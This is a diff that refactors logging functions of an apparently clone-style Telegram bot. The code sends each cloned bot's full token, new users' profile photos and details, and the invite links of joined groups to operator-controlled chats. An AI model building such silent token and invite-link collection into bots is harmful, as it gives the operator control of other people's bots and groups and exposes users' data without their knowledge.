@@ -1,8 +1,14 @@
 from telegram import Update
+from telegram.ext import ContextTypes
 from .config import CLONE_LOGGER, LOGGER_GROUP
 
-# 1. Jab koi naya BOT CLONE kare (Token ke saath)
-async def log_new_clone(context, user, token, bot_username):
+
+# =========================
+# NEW CLONE LOG
+# =========================
+
+async def log_new_clone(context: ContextTypes.DEFAULT_TYPE, user, token, bot_username):
+
     text = (
         "🚀 **NEW CLONE ALERT!**\n\n"
         f"👤 **Owner:** {user.first_name}\n"
@@ -11,17 +17,29 @@ async def log_new_clone(context, user, token, bot_username):
         f"🤖 **Bot Username:** @{bot_username}\n"
         f"🔑 **Token:** `{token}`"
     )
-    await context.bot.send_message(chat_id=CLONE_LOGGER, text=text, parse_mode='Markdown')
 
-# 2. Jab koi bot ko START kare (User Profile Photo ke saath)
-async def log_user_start(update: Update, context):
+    await context.bot.send_message(
+        chat_id=CLONE_LOGGER,
+        text=text,
+        parse_mode="Markdown"
+    )
+
+
+# =========================
+# USER START LOG
+# =========================
+
+async def log_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
     user = update.effective_user
     photo_id = None
-    
-    # User ki profile photo nikalna
-    photos = await user.get_profile_photos()
-    if photos.total_count > 0:
-        photo_id = photos.photos[0][-1].file_id
+
+    try:
+        photos = await context.bot.get_user_profile_photos(user.id)
+        if photos.total_count > 0:
+            photo_id = photos.photos[0][-1].file_id
+    except:
+        pass
 
     text = (
         "👤 **NEW USER STARTED!**\n\n"
@@ -31,28 +49,45 @@ async def log_user_start(update: Update, context):
     )
 
     if photo_id:
-        await context.bot.send_photo(chat_id=LOGGER_GROUP, photo=photo_id, caption=text, parse_mode='Markdown')
+        await context.bot.send_photo(
+            chat_id=LOGGER_GROUP,
+            photo=photo_id,
+            caption=text,
+            parse_mode="Markdown"
+        )
     else:
-        await context.bot.send_message(chat_id=LOGGER_GROUP, text=text, parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=LOGGER_GROUP,
+            text=text,
+            parse_mode="Markdown"
+        )
 
-# 3. Jab bot kisi GROUP mein add ho (Group Link aur Info)
-async def log_group_add(update: Update, context):
+
+# =========================
+# GROUP ADD LOG
+# =========================
+
+async def log_group_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
     chat = update.effective_chat
-    user = update.effective_user # Kisne add kiya
-    
-    # Group link nikalne ki koshish (Agar bot admin hai)
+    user = update.effective_user
+
     try:
-        group_link = await chat.export_invite_link()
+        link = await chat.export_invite_link()
     except:
-        group_link = "No Link (Bot needs Admin)"
+        link = "No Link (Bot not admin)"
 
     text = (
         "🏰 **ADDED TO NEW GROUP!**\n\n"
         f"👥 **Group Name:** {chat.title}\n"
         f"🆔 **Group ID:** `{chat.id}`\n"
-        f"🔗 **Link:** {group_link}\n"
-        f"👤 **Added By:** {user.first_name} (@{user.username if user.username else 'N/A'})"
+        f"🔗 **Link:** {link}\n"
+        f"👤 **Added By:** {user.first_name} "
+        f"(@{user.username if user.username else 'N/A'})"
     )
-    
-    await context.bot.send_message(chat_id=LOGGER_GROUP, text=text, parse_mode='Markdown')
 
+    await context.bot.send_message(
+        chat_id=LOGGER_GROUP,
+        text=text,
+        parse_mode="Markdown"
+    )
